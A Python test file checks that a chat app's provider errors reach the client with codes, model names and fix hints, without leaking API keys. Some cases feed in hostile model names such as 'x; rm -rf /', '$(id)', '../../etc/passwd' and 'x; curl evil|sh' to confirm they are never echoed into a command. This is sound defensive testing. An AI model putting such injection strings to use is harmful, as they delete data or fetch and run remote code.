"""Actionable provider errors (P1-11): code, exact model and a fix hint reach the client.

Covers the helper functions, the real Ollama adapter behind the real API (non-streaming and
streaming), the router, and the secrets / injection boundaries of what is echoed back.
"""

import json
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager

import httpx
import pytest
from httpx import ASGITransport, AsyncClient

from app.brain.orchestrator import BrainOrchestrator
from app.core.config import Settings
from app.main import create_app
from app.providers.base import (
    ChatMessage,
    ChatRequest,
    ChatResponse,
    ChatStreamChunk,
    LLMProvider,
    ModelInfo,
    ProviderConfigurationError,
    ProviderConnectionError,
    ProviderError,
    ProviderHealth,
    ProviderResponseError,
    ProviderTimeoutError,
    error_code,
    error_hint,
    error_payload,
)
from app.providers.ollama import OllamaProvider
from app.providers.openai import OpenAIProvider
from app.providers.router import ProviderRouter

# ====================================================================== helper functions


@pytest.mark.parametrize(
    ("exc", "code"),
    [
        (ProviderConnectionError("x", provider="ollama"), "provider_unreachable"),
        (ProviderTimeoutError("x", provider="ollama"), "provider_timeout"),
        (
            ProviderResponseError("x", provider="ollama", status_code=404, model="m"),
            "model_not_found",
        ),
        (
            ProviderResponseError("x", provider="ollama", status_code=404),
            "endpoint_not_found",
        ),
        (
            ProviderResponseError("x", provider="openai", status_code=404),
            "model_not_found",
        ),
        (
            ProviderResponseError("x", provider="openai", status_code=404, operation="list_models"),
            "endpoint_not_found",
        ),
        (ProviderResponseError("x", provider="openai", status_code=401), "authentication_failed"),
        (ProviderResponseError("x", provider="openai", status_code=403), "authentication_failed"),
        (ProviderResponseError("x", provider="openai", status_code=429), "rate_limited"),
        (ProviderResponseError("x", provider="ollama", status_code=500), "provider_response_error"),
        (ProviderResponseError("x", provider="ollama"), "provider_response_error"),
        (ProviderConfigurationError("x", provider="openai"), "provider_error"),
        (ProviderError("x"), "provider_error"),
    ],
)
def test_error_codes(exc: ProviderError, code: str) -> None:
    assert error_code(exc) == code


def test_ollama_not_running_hint_names_the_command_and_the_setting() -> None:
    hint = error_hint("provider_unreachable", "ollama")

    assert "ollama serve" in hint and "OLLAMA_BASE_URL" in hint


def test_missing_model_hint_names_the_exact_model_and_the_pull_command() -> None:
    hint = error_hint("model_not_found", "ollama", "qwen3.5:4b")

    assert "`ollama pull qwen3.5:4b`" in hint and "ollama list" in hint and "OLLAMA_MODEL" in hint


def test_missing_model_hint_without_a_known_name_uses_a_placeholder() -> None:
    assert "ollama pull <model>" in error_hint("model_not_found", "ollama")


@pytest.mark.parametrize(
    ("provider", "setting"),
    [("openai", "OPENAI"), ("anthropic", "ANTHROPIC"), ("gemini", "GEMINI")],
)
def test_cloud_hints_name_the_right_settings(provider: str, setting: str) -> None:
    assert f"{setting}_MODEL" in error_hint("model_not_found", provider)
    assert f"{setting}_API_KEY" in error_hint("authentication_failed", provider)
    assert f"{setting}_BASE_URL" in error_hint("provider_unreachable", provider)
    assert f"{setting}_TIMEOUT" in error_hint("provider_timeout", provider)


def test_cloud_hints_never_tell_the_user_to_pull_a_model() -> None:
    for provider in ("openai", "anthropic", "gemini", "something-new"):
        assert "ollama pull" not in (error_hint("model_not_found", provider) or "")


def test_ollama_authentication_failure_does_not_mention_an_api_key() -> None:
    hint = error_hint("authentication_failed", "ollama")

    assert "API_KEY" not in hint and "OLLAMA_BASE_URL" in hint


def test_unknown_provider_still_gets_a_generic_hint() -> None:
    assert error_hint("provider_unreachable", "brand-new") is not None
    assert error_hint("provider_response_error", "ollama") is None  # nothing useful to say


@pytest.mark.parametrize(
    "model", ["qwen3.5:4b", "llama3.2:latest", "hf.co/user/model:Q4_K_M", "a@b+c"]
)
def test_ordinary_model_ids_are_echoed(model: str) -> None:
    exc = ProviderResponseError("x", provider="ollama", status_code=404, model=model)

    assert error_payload(exc)["model"] == model
    assert f"`ollama pull {model}`" in error_payload(exc)["hint"]


@pytest.mark.parametrize(
    "model",
    [
        "",
        "x; rm -rf /",
        "a b",
        "`id`",
        "$(id)",
        "model\n",
        "../../etc/passwd",
        ".hidden",
        "x" * 200,
        "mödel",
        "m'odel",
        "m|odel",
    ],
    ids=repr,
)
def test_unsafe_model_names_are_never_put_into_a_command(model: str) -> None:
    exc = ProviderResponseError("x", provider="ollama", status_code=404, model=model)
    payload = error_payload(exc)

    assert "model" not in payload
    assert "ollama pull <model>" in payload["hint"]
    assert model.strip() == "" or model not in payload["hint"]


def test_payload_has_a_stable_shape() -> None:
    exc = ProviderResponseError("HTTP 404", provider="ollama", status_code=404, model="m:1")

    assert set(error_payload(exc)) == {"error", "code", "detail", "provider", "model", "hint"}
    assert error_payload(ProviderTimeoutError("t", provider="ollama")).keys() >= {
        "error",
        "code",
        "detail",
        "provider",
        "hint",
    }
    assert "hint" not in error_payload(
        ProviderResponseError("boom", provider="ollama", status_code=500)
    )


def test_payload_never_contains_secrets() -> None:
    secret = "sk-supersecretsupersecret123456"
    exc = ProviderResponseError(
        f"OpenAI returned HTTP 401: invalid key {secret} for Bearer {secret}",
        provider="openai",
        status_code=401,
    )

    assert secret not in json.dumps(error_payload(exc))


# ===================================================== real Ollama adapter behind the real API


def _ollama(handler) -> OllamaProvider:
    return OllamaProvider(
        base_url="http://mock-ollama:11434",
        default_model="qwen3.5:4b",
        client=httpx.AsyncClient(transport=httpx.MockTransport(handler)),
    )


@asynccontextmanager
async def api_with(provider: LLMProvider):
    app = create_app(Settings(_env_file=None, memory_enabled=False))
    app.state.provider = provider
    app.state.orchestrator = BrainOrchestrator(provider=provider)
    app.state.memory_service = None
    transport = ASGITransport(app=app, raise_app_exceptions=False)
    async with AsyncClient(transport=transport, base_url="http://localhost") as client:
        yield client


def _model_missing(request: httpx.Request) -> httpx.Response:
    model = json.loads(request.content)["model"]
    return httpx.Response(404, json={"error": f"model '{model}' not found, try pulling it first"})


async def test_chat_with_a_missing_model_tells_the_user_exactly_what_to_pull() -> None:
    async with api_with(_ollama(_model_missing)) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    body = res.json()
    assert res.status_code == 502
    assert body["code"] == "model_not_found" and body["error"] == "Model not available"
    assert body["model"] == "qwen3.5:4b" and body["provider"] == "ollama"
    assert "`ollama pull qwen3.5:4b`" in body["hint"]


async def test_the_model_named_in_the_request_is_the_one_reported() -> None:
    async with api_with(_ollama(_model_missing)) as client:
        res = await client.post("/api/chat", json={"message": "hello", "model": "llama9:latest"})

    body = res.json()
    assert body["model"] == "llama9:latest" and "`ollama pull llama9:latest`" in body["hint"]


async def test_a_hostile_model_name_in_the_request_cannot_inject_a_command() -> None:
    async with api_with(_ollama(_model_missing)) as client:
        res = await client.post("/api/chat", json={"message": "hi", "model": "x; curl evil|sh"})

    body = res.json()
    assert "model" not in body and "evil" not in body["hint"]
    assert "ollama pull <model>" in body["hint"]


async def test_chat_while_ollama_is_not_running_says_how_to_start_it() -> None:
    def refused(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("All connection attempts failed")

    async with api_with(_ollama(refused)) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    body = res.json()
    assert res.status_code == 503
    assert body["code"] == "provider_unreachable" and body["error"] == "Provider connection failed"
    assert "ollama serve" in body["hint"] and "OLLAMA_BASE_URL" in body["hint"]
    assert "mock-ollama" in body["detail"]  # the address it tried is shown


async def test_a_slow_model_suggests_a_smaller_model_or_a_longer_timeout() -> None:
    def slow(request: httpx.Request) -> httpx.Response:
        raise httpx.ReadTimeout("timed out")

    async with api_with(_ollama(slow)) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    body = res.json()
    assert res.status_code == 504 and body["code"] == "provider_timeout"
    assert "OLLAMA_TIMEOUT" in body["hint"] and "smaller model" in body["hint"]


@pytest.mark.parametrize(
    ("status", "code"),
    [
        (401, "authentication_failed"),
        (403, "authentication_failed"),
        (429, "rate_limited"),
        (500, "provider_response_error"),
    ],
)
async def test_other_http_errors_get_a_code(status: int, code: str) -> None:
    async with api_with(_ollama(lambda r: httpx.Response(status, text="nope"))) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    assert res.status_code == 502 and res.json()["code"] == code


async def test_existing_error_fields_are_still_there() -> None:
    async with api_with(_ollama(_model_missing)) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    assert {"error", "detail", "provider"} <= set(res.json())


async def test_a_cloud_provider_401_points_at_the_api_key_without_leaking_it() -> None:
    key = "sk-testkey-testkey-testkey-1234567890"

    def unauthorized(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            401, json={"error": {"message": f"Incorrect API key provided: {key}"}}
        )

    provider = OpenAIProvider(
        api_key=key,
        client=httpx.AsyncClient(transport=httpx.MockTransport(unauthorized)),
    )
    async with api_with(provider) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    body = res.json()
    assert body["code"] == "authentication_failed" and "OPENAI_API_KEY" in body["hint"]
    assert key not in res.text


async def test_a_cloud_provider_404_points_at_the_model_setting() -> None:
    provider = OpenAIProvider(
        api_key="test-openai-key",
        client=httpx.AsyncClient(
            transport=httpx.MockTransport(lambda r: httpx.Response(404, text="no such model"))
        ),
    )
    async with api_with(provider) as client:
        res = await client.post("/api/chat", json={"message": "hello"})

    body = res.json()
    assert body["code"] == "model_not_found" and "OPENAI_MODEL" in body["hint"]
    assert "ollama" not in body["hint"].lower()


# ============================================================================= streaming


def _events(text: str) -> list[dict]:
    return [json.loads(line[6:]) for line in text.splitlines() if line.startswith("data: {")]


async def test_stream_that_fails_at_once_sends_an_error_event_with_the_hint() -> None:
    async with api_with(_ollama(_model_missing)) as client:
        res = await client.post("/api/chat/stream", json={"message": "hello"})

    events = _events(res.text)
    error = events[-1]["error"]
    assert error["code"] == "model_not_found" and error["model"] == "qwen3.5:4b"
    assert "`ollama pull qwen3.5:4b`" in error["hint"]
    assert "[DONE]" not in res.text


async def test_stream_while_ollama_is_down_says_how_to_start_it() -> None:
    def refused(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("refused")

    async with api_with(_ollama(refused)) as client:
        res = await client.post("/api/chat/stream", json={"message": "hello"})

    error = _events(res.text)[-1]["error"]
    assert error["code"] == "provider_unreachable" and "ollama serve" in error["hint"]


class _DiesMidStream(LLMProvider):
    async def generate(self, request: ChatRequest) -> ChatResponse:
        raise AssertionError("not used")

    async def stream(self, request: ChatRequest) -> AsyncIterator[ChatStreamChunk]:
        yield ChatStreamChunk(delta="Hello ", model="m", provider="ollama")
        raise ProviderTimeoutError("took too long", provider="ollama")

    async def list_models(self) -> list[ModelInfo]:
        return []

    async def health_check(self) -> ProviderHealth:
        return ProviderHealth(healthy=True, provider="ollama")

    async def aclose(self) -> None:
        pass


async def test_stream_that_dies_midway_keeps_the_text_and_adds_the_error_event() -> None:
    async with api_with(_DiesMidStream()) as client:
        res = await client.post("/api/chat/stream", json={"message": "hello"})

    events = _events(res.text)
    assert events[0]["delta"] == "Hello "
    assert events[-1]["error"]["code"] == "provider_timeout"
    assert "[DONE]" not in res.text


async def test_a_successful_stream_has_no_error_event() -> None:
    def ok(request: httpx.Request) -> httpx.Response:
        lines = [
            {"model": "qwen3.5:4b", "message": {"content": "Hi"}, "done": False},
            {
                "model": "qwen3.5:4b",
                "message": {"content": ""},
                "done": True,
                "done_reason": "stop",
            },
        ]
        return httpx.Response(200, text="\n".join(json.dumps(x) for x in lines))

    async with api_with(_ollama(ok)) as client:
        res = await client.post("/api/chat/stream", json={"message": "hello"})

    assert "[DONE]" in res.text and all("error" not in e for e in _events(res.text))


class _Crashes(_DiesMidStream):
    async def stream(self, request: ChatRequest) -> AsyncIterator[ChatStreamChunk]:
        raise RuntimeError("internal detail: /srv/secret/path")
        yield  # pragma: no cover


async def test_unexpected_errors_are_not_described_to_the_client() -> None:
    async with api_with(_Crashes()) as client:
        res = await client.post("/api/chat/stream", json={"message": "hello"})

    assert "secret" not in res.text and "RuntimeError" not in res.text
    assert not any("error" in e for e in _events(res.text))


# ===================================================================================== router


async def test_router_keeps_the_failing_model_and_does_not_retry_a_missing_model() -> None:
    calls = {"n": 0}

    def handler(request: httpx.Request) -> httpx.Response:
        calls["n"] += 1
        return _model_missing(request)

    router = ProviderRouter(settings=Settings(_env_file=None, ai_max_retries=3))
    router._provider_pool["ollama"] = _ollama(handler)
    request = ChatRequest(messages=[ChatMessage(role="user", content="hi")], model="llama9:latest")

    with pytest.raises(ProviderResponseError) as info:
        await router.generate(request)

    assert info.value.status_code == 404 and info.value.model == "llama9:latest"
    assert calls["n"] == 1, "a missing model is permanent: retrying cannot help"
    assert "`ollama pull llama9:latest`" in error_payload(info.value)["hint"]
